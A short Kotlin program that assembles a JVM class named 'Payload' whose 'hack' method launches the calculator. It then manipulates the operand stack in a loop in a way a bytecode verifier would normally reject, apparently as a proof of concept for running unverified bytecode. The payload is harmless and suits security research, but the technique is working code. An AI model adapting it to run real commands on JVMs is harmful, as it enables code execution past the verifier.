package codes.som.noverify

import codes.som.anthony.koffee.assembleClass
import codes.som.anthony.koffee.insns.jvm.*
import codes.som.anthony.koffee.modifiers.public
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.tree.ClassNode
import java.io.FileOutputStream
import java.io.PrintStream


fun saveClz(payload: ClassNode) {

    val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)
    payload.accept(classWriter)
    val fos = FileOutputStream("Payload.class")
    fos.write(classWriter.toByteArray())
    fos.close()
    println("success")
}

fun main() {
    saveClz(assembleClass(public, "Payload") {
        method(public + static, "hack", void) {

            new(ProcessBuilder::class.java)
            dup
            iconst_1
            anewarray(String::class.java)
            dup
            iconst_0
            ldc("gnome-calculator")
            aastore
            invokespecial(ProcessBuilder::class.java,"<init>",void, Array<String>::class)
            invokevirtual(ProcessBuilder::class.java,"start",Process::class.java)
            pop

            bipush(3)
            istore_1 // locals[1] = 3, where locals[1] will be our counter
            +L["loop_start"]
            ldc("1ue")
            iinc(1, -1) // and decrement the counter.
            iload_1
            ifne(L["loop_start"]) // If the counter isn't zero yet, go back to the loop head.

            swap

            for (i in 0 until 3) {
                getstatic(System::class, "out", PrintStream::class)
                swap
                invokevirtual(PrintStream::class, "println", void, String::class)
            }

            _return
        }
    })
}